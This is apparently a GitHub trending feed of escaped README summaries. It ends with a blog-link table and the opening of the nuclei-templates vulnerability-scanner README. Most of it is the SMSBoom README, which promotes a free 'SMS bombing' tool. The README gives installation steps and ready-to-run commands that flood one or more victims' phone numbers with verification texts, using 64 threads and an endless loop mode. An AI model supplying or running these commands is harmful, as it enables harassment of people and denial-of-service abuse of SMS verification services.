&lt;td&gt;豆瓣&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://flaneur2020.github.io/&#34;&gt;F叔&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.01.27&lt;/td&gt; &#xA;   &lt;td&gt;厉害的人&lt;/td&gt; &#xA;   &lt;td&gt;希望有一天能看懂&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://disksing.com/&#34;&gt;硬盘在歌唱&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.02.07&lt;/td&gt; &#xA;   &lt;td&gt;前辈&lt;/td&gt; &#xA;   &lt;td&gt;数据库&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://catcoding.me/archives/&#34;&gt;程序员的喵&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.02.11&lt;/td&gt; &#xA;   &lt;td&gt;写到 60 岁&lt;/td&gt; &#xA;   &lt;td&gt;cool&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://leimao.github.io/&#34;&gt;Lei Mao&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.03.16&lt;/td&gt; &#xA;   &lt;td&gt;图形学&lt;/td&gt; &#xA;   &lt;td&gt;徒步&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.cnxct.com/&#34;&gt;CFC4N&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.03.26&lt;/td&gt; &#xA;   &lt;td&gt;黑客&lt;/td&gt; &#xA;   &lt;td&gt;安全&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://tech.zealscott.com/curriculum/&#34;&gt;ZealScott&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.03.30&lt;/td&gt; &#xA;   &lt;td&gt;学习&lt;/td&gt; &#xA;   &lt;td&gt;优秀的少年&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.dingmos.com/&#34;&gt;dingmos&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.04.13&lt;/td&gt; &#xA;   &lt;td&gt;向他学习&lt;/td&gt; &#xA;   &lt;td&gt;Linux 少年&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://zilongshanren.com/&#34;&gt;子龙山人&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.05.12&lt;/td&gt; &#xA;   &lt;td&gt;游戏&lt;/td&gt; &#xA;   &lt;td&gt;Emacs&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.hidva.com/&#34;&gt;hidva&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.05.20&lt;/td&gt; &#xA;   &lt;td&gt;牛逼&lt;/td&gt; &#xA;   &lt;td&gt;gpdb&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://martins3.github.io/&#34;&gt;martins3&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;2022.05.30&lt;/td&gt; &#xA;   &lt;td&gt;linux&lt;/td&gt; &#xA;   &lt;td&gt;优秀的年轻人&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt;</summary>
  </entry>
  <entry>
    <title>WhaleFell/SMSBoom</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/WhaleFell/SMSBoom</id>
    <link href="https://github.com/WhaleFell/SMSBoom" rel="alternate"></link>
    <summary type="html">&lt;p&gt;短信轰炸/短信测压/ | 一个健壮免费的python短信轰炸程序，专门炸坏蛋蛋，百万接口，多线程全自动添加有效接口，支持异步协程百万并发，全免费的短信轰炸工具！！高一美术生开发全网首发！！&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/smsboom-logo.png&#34; alt=&#34;logo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/WhaleFell/SMSBoom/master/img/test2.gif&#34; alt=&#34;test&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;免责声明&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;本程序由一位 &lt;strong&gt;高一摆烂美术生&lt;/strong&gt; 开发( &lt;strong&gt;15周岁未成年&lt;/strong&gt; ),若使用者滥用本项目,本人 &lt;strong&gt;无需承担&lt;/strong&gt; 任何法律责任.&lt;/li&gt; &#xA; &lt;li&gt;本程序仅供娱乐,源码全部开源,&lt;strong&gt;禁止滥用&lt;/strong&gt; 和二次 &lt;strong&gt;贩卖盈利&lt;/strong&gt;. &lt;strong&gt;禁止用于商业用途&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;本人有 &lt;strong&gt;抑郁症病史&lt;/strong&gt;,若本人遭受任何形式的网络暴力(包括但不限于发送淫/秽血/腥图片,问候我家人),并出现 &lt;strong&gt;极端行为&lt;/strong&gt;,一切都是 &lt;strong&gt;本人的错&lt;/strong&gt; 和大家无关.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Feature&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;通过自定义 &lt;code&gt;api.json&lt;/code&gt; 的方式定义接口.&lt;/li&gt; &#xA; &lt;li&gt;支持关键字替换. &lt;strong&gt;时间戳&lt;/strong&gt; &lt;code&gt;[timestamp]&lt;/code&gt; &lt;strong&gt;手机号&lt;/strong&gt; &lt;code&gt;[phone]&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;多线程/异步 请求.&lt;/li&gt; &#xA; &lt;li&gt;通过 Flask 提供网页测试/添加接口.&lt;/li&gt; &#xA; &lt;li&gt;友好的命令行参数支持.&lt;/li&gt; &#xA; &lt;li&gt;采用方便的 pipenv 包管理.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Quick Start&lt;/h2&gt; &#xA;&lt;h3&gt;适用于小白&lt;/h3&gt; &#xA;&lt;p&gt;✨本项目已经使用 &lt;code&gt;pyinstaller&lt;/code&gt; 打包成 &lt;code&gt;EXE&lt;/code&gt; 可执行文件!免去部署 Python 环境的烦恼,适合用于小白白.&lt;/p&gt; &#xA;&lt;p&gt;🔨作者的打包环境为: &lt;code&gt;Windows 10 x64 Python3.8&lt;/code&gt; 如果 Windows 系统不是 &lt;strong&gt;Windows 10 64位&lt;/strong&gt; 版本,&lt;strong&gt;可能会运行失败&lt;/strong&gt;! 如果出现异常报错请截图发 Issue.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;下载 EXE 可执行文件&lt;br&gt; 请移步到项目的 &lt;a href=&#34;https://github.com/AdminWhaleFall/SMSBoom/releases&#34;&gt;release页&lt;/a&gt; 下载&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;若遇到国内网络环境下载不下来,请参见 &lt;a href=&#34;https://github.do/&#34;&gt;https://github.do/&lt;/a&gt; 等加速镜像.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;运行&lt;/p&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt; &lt;p&gt;在任意盘(&lt;strong&gt;除C盘外&lt;/strong&gt;)中新建一个文件夹.将程序移动到其中. e.g.&lt;br&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/e.g.1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;code&gt;Win&lt;/code&gt;+&lt;code&gt;R&lt;/code&gt; 打开cmd.输入存放的盘符.例如: &lt;code&gt;E:&lt;/code&gt; 然后cd到文件夹,例如 &lt;code&gt;cd SMS&lt;/code&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/cmd1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;确认 cmd 路径是 EXE 所在路径后,cmd 输入:&lt;code&gt;smsboom_pyinstall.exe&lt;/code&gt;,若出现命令提示,则说明脚本已正常运行. &lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/cmd2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;使用前必须更新一遍最新接口&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;smsboom_pyinstall.exe update&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;若更新接口出现错误 &lt;code&gt;ssl_&lt;/code&gt;,请参见 &lt;a href=&#34;https://github.com/AdminWhaleFall/SMSBoom/issues/2&#34;&gt;issue&lt;/a&gt; &lt;strong&gt;关闭代理软件&lt;/strong&gt;再 update.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &#xA;  &lt;ol start=&#34;7&#34;&gt; &#xA;   &lt;li&gt;传递参数,命令示例:&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;p&gt;启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),只轰//炸一波。&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;启动64个线程,轰//炸多个人的手机号(19xxxxxxx),启动循环轰//炸，每个循环间隔60秒&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -s -i 60&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;启动64个线程,轰//炸多个人的手机号(138xxx,139xxxx),启动循环轰//炸,每个循环间隔60秒。&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;smsboom_pyinstall.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -s -i 60&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;适用于大佬&lt;/h3&gt; &#xA;&lt;h4&gt;下载项目&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;方法一：使用Git:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git clone https://github.com/AdminWhaleFall/SMSBoom.git/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;墙国加速&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git clone https://github.do/https://github.com/AdminWhaleFall/SMSBoom.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;方法二：点击下载&lt;a href=&#34;https://github.com/AdminWhaleFall/SMSBoom/archive/refs/heads/master.zip&#34;&gt;项目压缩包&lt;/a&gt;并解压.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;配置环境&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;前提条件:&lt;/strong&gt; 请确保自己的电脑有 &lt;code&gt;python3.x&lt;/code&gt; 的环境,推荐使用 &lt;code&gt;3.8&lt;/code&gt; 及以上!&lt;/p&gt; &#xA;&lt;p&gt;方案一: 有 &lt;code&gt;Python3.8&lt;/code&gt; 环境的可以使用 &lt;code&gt;pipenv&lt;/code&gt; 工具.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;安装 pipenv 包管理工具.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pip install pipenv&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;为项目构建虚拟环境.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pipenv install  # 仅使用轰//炸功能&#xA;pipenv install --dev # 使用 webui 调试接口功能.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;尝试运行 smsboom.py&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pipenv shell # 激活虚拟环境&#xA;python smsboom.py  # linux&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;若无报错，输出帮助信息，则说明环境已经正确安装。若报错请使用方案二&lt;/p&gt; &#xA;&lt;p&gt;方案二: 只有 &lt;code&gt;Python3.X&lt;/code&gt; 环境的需要使用原生 &lt;code&gt;pip&lt;/code&gt; 工具.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;安装所需要的库&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pip install -r requirements.txt # 仅使用轰//炸&#xA;pip install -r requirements-dev.txt # 使用 webui&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;尝试运行 smsboom.py&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python smsboom.py &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;若无报错，输出帮助信息，则说明环境已经正确安装。&lt;/p&gt; &#xA;&lt;h4&gt;运行&lt;/h4&gt; &#xA;&lt;p&gt;若使用虚拟环境,请先激活. &lt;code&gt;pipenv shell&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 输出帮助信息&#xA;python smsboom.py --help&#xA;&#xA;Usage: smsboom.py [OPTIONS] COMMAND [ARGS]...    &#xA;Options:&#xA;--help  Show this message and exit.&#xA;Commands:&#xA;run     传入线程数和手机号启动轰//炸,支持多手机号&#xA;update  从 github 获取最新接口&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;启动轰//炸&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;帮助信息:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python smsboom.py run --help&#xA;&#xA;Usage: smsboom.py run [OPTIONS]&#xA;&#xA;传入线程数和手机号启动轰//炸,支持多手机号&#xA;&#xA;Options:&#xA;-t, --thread INTEGER    线程数(默认64)&#xA;-p, --phone TEXT        手机号,可传入多个再使用-p传递  [required]&#xA;-s, --super             循环模式&#xA;-i, --interval INTEGER  循环间隔时间(默认60s)&#xA;--help                  Show this message and exit.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;命令示例&lt;/h3&gt; &#xA;&lt;p&gt;启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),只轰//炸一波。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python smsboom.py run -t 64 -p 198xxxxxxxxx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;启动64个线程,轰//炸多个人的手机号(19xxxxxxx),启动循环轰//炸，每个循环间隔60秒&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python smsboom.py run -t 64 -p 198xxxxxxxxx -s -i 60&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;启动64个线程,轰//炸多个人的手机号(138xxx,139xxxx),启动循环轰//炸,每个循环间隔60秒。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python smsboom.py run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -s -i 60&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;p&gt;程序提供接口调试工具，但目前还不完善，欢迎前端大佬 PR。&lt;br&gt; 调试工具以 &lt;code&gt;Flask&lt;/code&gt; 为后端，&lt;code&gt;vue&lt;/code&gt; 为前端，实现前后端分离。&lt;br&gt; 目前只有测试接口，添加接口的功能。&lt;/p&gt; &#xA;&lt;h3&gt;Flask 前端调试&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;前提是已经根据前文 Quick Start 的方式安装好 pipenv 环境&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;pipenv shell # 激活虚拟环境&#xA;python run_flask_app.py start -p 9090 # 监听9090端口&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;运行帮助:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Usage: run_flask_app.py [OPTIONS] COMMAND [ARGS]...&#xA;&#xA;Options:&#xA;  --help  Show this message and exit.&#xA;&#xA;Commands:&#xA;  init         初始化数据库&#xA;  json2sqlite  将json数据转为sqlite数据库&#xA;  sqlite2json  将sqlite数据转为json&#xA;  start        启动 flask app&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Usage: run_flask_app.py start [OPTIONS]&#xA;&#xA;  启动 flask app&#xA;&#xA;Options:&#xA;  -h, --host TEXT     监听地址&#xA;  -p, --port INTEGER  监听端口&#xA;  --help              Show this message and exit.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;默认监听 &lt;em&gt;0.0.0.0:9090&lt;/em&gt; 地址,浏览器访问&lt;a href=&#34;http://127.0.0.1:9090/admin/&#34;&gt;http://127.0.0.1:9090/admin/&lt;/a&gt;若无意外,就可以出现前端调试界面。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/WhaleFell/SMSBoom/master/img/webui-test.png&#34; alt=&#34;&#34;&gt;&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/WhaleFell/SMSBoom/master/img/webui-test-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;赞助&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://afdian.net/@smsboom&#34;&gt;爱发电🔗&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;微/信 &amp;amp;&amp;amp; 支/付宝🔗&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;center class=&#34;half&#34;&gt; &#xA; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/wx_pay.jpg&#34; width=&#34;40%/&#34;&gt; &#xA; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/SMSBoom@master/img/aliyun_pay.jpg&#34; width=&#34;40%/&#34;&gt; &#xA;&lt;/center&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;赞助的金额将用于我每月治疗 &lt;strong&gt;抑/郁症&lt;/strong&gt; 的支出.谢谢大家的支持和鼓励! &lt;strong&gt;比心ing&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;center class=&#34;half&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/WhaleFell/SMSBoom/master/img/mypic.png&#34; width=&#34;70%/&#34;&gt; &#xA;&lt;/center&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;del&gt;丑陋的自拍 )逃&lt;/del&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Star ♥ 趋势图&lt;/h2&gt; &#xA;&lt;img src=&#34;https://starchart.cc/adminwhalefall/smsboom.svg?sanitize=true&#34;&gt; &#xA;&lt;h2&gt;✨讨论&lt;/h2&gt; &#xA;&lt;p&gt;欢迎加入讨论对项目提出问题和建议！！！mua!&lt;/p&gt; &#xA;&lt;h3&gt;企鹅🐧群&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;企鹅群不允许讨论相关敏感信息!违者上飞机票✈&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/AdminWhaleFall/Pic@master/img/20220409151539.jpg&#34; alt=&#34;企鹅群 QR&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Telegram Channel (TG群组)&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;涉及敏/感信息,政/治,民/主运动话题请到 &lt;strong&gt;TG群聊&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://t.me/SMSBoomPro&#34;&gt;SMSBoomPro&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>projectdiscovery/nuclei-templates</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/projectdiscovery/nuclei-templates</id>
    <link href="https://github.com/projectdiscovery/nuclei-templates" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Community curated list of templates for the nuclei engine to find security vulnerabilities.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; Nuclei Templates &lt;/h1&gt; &#xA;&lt;h4 align=&#34;center&#34;&gt;Community curated list of templates for the nuclei engine to find security vulnerabilities in applications.&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/projectdiscovery/nuclei-templates&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/pdnuclei&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/pdnuclei.svg?logo=twitter&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/projectdiscovery&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/695645237418131507.svg?logo=discord&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://nuclei.projectdiscovery.io/templating-guide/&#34;&gt;Documentation&lt;/a&gt; • &lt;a href=&#34;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/#-contributions&#34;&gt;Contributions&lt;/a&gt; • &lt;a href=&#34;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/#-discussion&#34;&gt;Discussion&lt;/a&gt; • &lt;a href=&#34;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/#-community&#34;&gt;Community&lt;/a&gt; • &lt;a href=&#34;https://nuclei.projectdiscovery.io/faq/templates/&#34;&gt;FAQs&lt;/a&gt; • &lt;a href=&#34;https://discord.gg/projectdiscovery&#34;&gt;Join Discord&lt;/a&gt; &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Templates are the core of the &lt;a href=&#34;https://github.com/projectdiscovery/nuclei&#34;&gt;nuclei scanner&lt;/a&gt; which powers the actual scanning engine. This repository stores and houses various templates for the scanner provided by our team, as well as contributed by the community. We hope that you also contribute by sending templates via &lt;strong&gt;pull requests&lt;/strong&gt; or &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&amp;amp;labels=&amp;amp;template=submit-template.md&amp;amp;title=%5Bnuclei-template%5D+&#34;&gt;Github issues&lt;/a&gt; to grow the list.&lt;/p&gt; &#xA;&lt;h2&gt;Nuclei Templates overview&lt;/h2&gt; &#xA;&lt;p&gt;An overview of the nuclei template project, including statistics on unique tags, author, directory, severity, and type of templates. The table below contains the top ten statistics for each matrix; an expanded version of this is &lt;a href=&#34;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/TEMPLATES-STATS.md&#34;&gt;available here&lt;/a&gt;, and also available in &lt;a href=&#34;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/TEMPLATES-STATS.json&#34;&gt;JSON&lt;/a&gt; format for integration.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt; &#xA;   &lt;td&gt; &lt;h2&gt;Nuclei Templates Top 10 statistics&lt;/h2&gt; &#xA;    &lt;table&gt; &#xA;     &lt;thead&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;th&gt;TAG&lt;/th&gt; &#xA;       &lt;th&gt;COUNT&lt;/th&gt; &#xA;       &lt;th&gt;AUTHOR&lt;/th&gt; &#xA;       &lt;th&gt;COUNT&lt;/th&gt; &#xA;       &lt;th&gt;DIRECTORY&lt;/th&gt; &#xA;       &lt;th&gt;COUNT&lt;/th&gt; &#xA;       &lt;th&gt;SEVERITY&lt;/th&gt; &#xA;       &lt;th&gt;COUNT&lt;/th&gt; &#xA;       &lt;th&gt;TYPE&lt;/th&gt; &#xA;       &lt;th&gt;COUNT&lt;/th&gt; &#xA;      &lt;/tr&gt; &#xA;     &lt;/thead&gt; &#xA;     &lt;tbody&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;cve&lt;/td&gt; &#xA;       &lt;td&gt;1191&lt;/td&gt; &#xA;       &lt;td&gt;daffainfo&lt;/td&gt; &#xA;       &lt;td&gt;565&lt;/td&gt; &#xA;       &lt;td&gt;cves&lt;/td&gt; &#xA;       &lt;td&gt;1196&lt;/td&gt; &#xA;       &lt;td&gt;info&lt;/td&gt; &#xA;       &lt;td&gt;1220&lt;/td&gt; &#xA;       &lt;td&gt;http&lt;/td&gt; &#xA;       &lt;td&gt;3263&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;panel&lt;/td&gt; &#xA;       &lt;td&gt;524&lt;/td&gt; &#xA;       &lt;td&gt;dhiyaneshdk&lt;/td&gt; &#xA;       &lt;td&gt;424&lt;/td&gt; &#xA;       &lt;td&gt;exposed-panels&lt;/td&gt; &#xA;       &lt;td&gt;533&lt;/td&gt; &#xA;       &lt;td&gt;high&lt;/td&gt; &#xA;       &lt;td&gt;895&lt;/td&gt; &#xA;       &lt;td&gt;file&lt;/td&gt; &#xA;       &lt;td&gt;68&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;lfi&lt;/td&gt; &#xA;       &lt;td&gt;467&lt;/td&gt; &#xA;       &lt;td&gt;pikpikcu&lt;/td&gt; &#xA;       &lt;td&gt;316&lt;/td&gt; &#xA;       &lt;td&gt;vulnerabilities&lt;/td&gt; &#xA;       &lt;td&gt;458&lt;/td&gt; &#xA;       &lt;td&gt;medium&lt;/td&gt; &#xA;       &lt;td&gt;681&lt;/td&gt; &#xA;       &lt;td&gt;network&lt;/td&gt; &#xA;       &lt;td&gt;50&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;xss&lt;/td&gt; &#xA;       &lt;td&gt;379&lt;/td&gt; &#xA;       &lt;td&gt;pdteam&lt;/td&gt; &#xA;       &lt;td&gt;266&lt;/td&gt; &#xA;       &lt;td&gt;technologies&lt;/td&gt; &#xA;       &lt;td&gt;258&lt;/td&gt; &#xA;       &lt;td&gt;critical&lt;/td&gt; &#xA;       &lt;td&gt;421&lt;/td&gt; &#xA;       &lt;td&gt;dns&lt;/td&gt; &#xA;       &lt;td&gt;17&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;wordpress&lt;/td&gt; &#xA;       &lt;td&gt;375&lt;/td&gt; &#xA;       &lt;td&gt;geeknik&lt;/td&gt; &#xA;       &lt;td&gt;181&lt;/td&gt; &#xA;       &lt;td&gt;exposures&lt;/td&gt; &#xA;       &lt;td&gt;205&lt;/td&gt; &#xA;       &lt;td&gt;low&lt;/td&gt; &#xA;       &lt;td&gt;186&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;rce&lt;/td&gt; &#xA;       &lt;td&gt;302&lt;/td&gt; &#xA;       